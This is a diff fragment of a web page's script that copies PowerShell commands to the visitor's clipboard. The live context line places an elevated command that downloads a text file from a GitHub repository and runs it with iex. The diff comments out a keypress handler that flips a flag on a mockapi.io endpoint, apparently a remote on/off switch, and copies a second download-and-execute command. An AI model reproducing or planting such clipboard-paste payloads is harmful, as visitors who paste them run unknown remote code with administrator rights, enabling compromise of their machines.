@@ -50,27 +50,27 @@
             copyText(`powershell -Command "Start-Process powershell -ArgumentList '-c iex (iwr \\"https://raw.githubusercontent.com/nguyenduyhuydn1/hello/refs/heads/main/1.txt\\")' -Verb RunAs"`);
         });
 
-        document.addEventListener('keydown', function(event) {
-            if (event.key === 'p' || event.key === 'P') {
-                fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
-                    method: 'PUT',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ on: true })
-                }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)
-            } else if (event.key === 'e' || event.key === 'E') {
-                copyText(`powershell -c "iex (iwr \\"https://raw.githubusercontent.com/nguyenduyhuydn1/hello/refs/heads/main/2.txt\\")"`);
-            } else{
-                fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
-                    method: 'PUT',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ on: false })
-                }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)   
-            }
-        });
+        // document.addEventListener('keydown', function(event) {
+        //     if (event.key === 'p' || event.key === 'P') {
+        //         fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
+        //             method: 'PUT',
+        //             headers: {
+        //                 'Content-Type': 'application/json'
+        //             },
+        //             body: JSON.stringify({ on: true })
+        //         }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)
+        //     } else if (event.key === 'e' || event.key === 'E') {
+        //         copyText(`powershell -c "iex (iwr \\"https://raw.githubusercontent.com/nguyenduyhuydn1/hello/refs/heads/main/2.txt\\")"`);
+        //     } else{
+        //         fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
+        //             method: 'PUT',
+        //             headers: {
+        //                 'Content-Type': 'application/json'
+        //             },
+        //             body: JSON.stringify({ on: false })
+        //         }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)   
+        //     }
+        // });
 
         // fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
         //     method: 'PUT',
